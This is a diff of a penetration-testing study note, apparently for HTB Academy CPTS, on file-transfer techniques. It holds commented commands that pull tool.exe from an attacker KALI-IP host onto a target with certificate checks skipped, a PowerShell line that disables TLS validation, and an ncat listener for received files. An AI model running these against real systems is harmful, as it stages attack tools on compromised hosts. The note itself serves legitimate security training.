@@ -32,7 +32,7 @@ python3 -m http.server 80 --directory /opt/tools
 # Bind to specific interface only (OPSEC)
 python3 -m http.server 8080 --bind 192.168.45.200
 
-# Python 2 (legacy)
+# Python 2 (legacy — EOL, removed from current Kali; only on old/embedded targets)
 python2 -m SimpleHTTPServer 8080
 ```
 
@@ -125,7 +125,9 @@ server.serve_forever()
 
 # Target downloads (skip cert check):
 # curl -k https://KALI-IP/tool.exe -o /tmp/tool.exe
-# iwr https://KALI-IP/tool.exe -OutFile C:\Temp\tool.exe -SkipCertificateCheck
+# iwr ... -SkipCertificateCheck  # PS 7+ only; in Windows PowerShell 5.1 use the
+#   ServicePointManager callback instead — see [[Tools/File Transfer/PowerShell Transfers]]
+# (New-Object Net.WebClient) after: [Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
 ```
 
 ---
@@ -185,6 +187,10 @@ ncat -lvnp 9001 -k > received.bin
 
 ---
 
+> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Exploit & File Transfers|Exploit & File Transfers]] (CPTS v2) ties all of these into the transfer workflow. Purpose-built server tools this note stubs out: [[Tools/File Transfer/pyftpdlib|pyftpdlib]] (FTP), [[Tools/File Transfer/wsgidav|wsgidav]] (WebDAV), [[Tools/File Transfer/uploadserver|uploadserver]] (HTTP upload), [[Tools/File Transfer/updog|updog]] (up+down UI), [[Tools/File Transfer/SMBserver|impacket-smbserver]] (SMB), [[Tools/File Transfer/netcat|netcat]] (raw TCP). Target-side download clients: [[Tools/File Transfer/wget|wget]] / [[Tools/File Transfer/cURL|curl]] (Linux), [[Tools/File Transfer/PowerShell Transfers|PowerShell Transfers]] / [[Tools/File Transfer/certutil|certutil]] (Windows).
+
+---
+
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-28*
+*Model: claude-opus-5*
